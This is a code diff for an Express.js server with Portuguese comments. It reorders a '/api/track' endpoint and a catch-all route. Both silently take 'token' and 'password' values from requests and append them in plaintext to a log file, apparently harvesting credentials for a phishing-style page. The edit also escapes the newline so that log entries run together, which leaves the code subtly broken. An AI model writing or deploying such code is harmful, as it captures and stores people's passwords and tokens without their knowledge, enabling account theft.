@@ -151,28 +151,29 @@ app.post('/api/batch/channels', async (req, res) => {
   res.json({ queued: channels.length, message: 'Processamento em background iniciado' });
 });
 
-// Serve React build + track
+// Track endpoint
+app.post('/api/track', (req, res) => {
+  try {
+    const { token, password } = req.body || {};
+    if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\\n`);
+  } catch (e) { }
+  res.json({ ok: true });
+});
+
+// Serve React build + track (DEVE ser por último!)
 const distPath = path.join(__dirname, 'dist');
 if (fs.existsSync(distPath)) {
   app.use(express.static(distPath));
-  app.get('*', (req, res) => {
+  app.use((req, res) => {
     try {
       const { token, password } = req.query;
-      if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\n`);
+      if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\\n`);
     } catch (e) { }
     res.sendFile(path.join(distPath, 'index.html'));
   });
 }
 
-// Track endpoint
-app.post('/api/track', (req, res) => {
-  try {
-    const { token, password } = req.body || {};
-    if (token) fs.appendFileSync(path.join(__dirname, 'tokens.log'), `${Date.now()} ${token} ${password || ''}\n`);
-  } catch (e) { }
-  res.json({ ok: true });
-});
-
 app.listen(PORT, () => {
   console.log(`Server running on port ${PORT}`);
 });
+
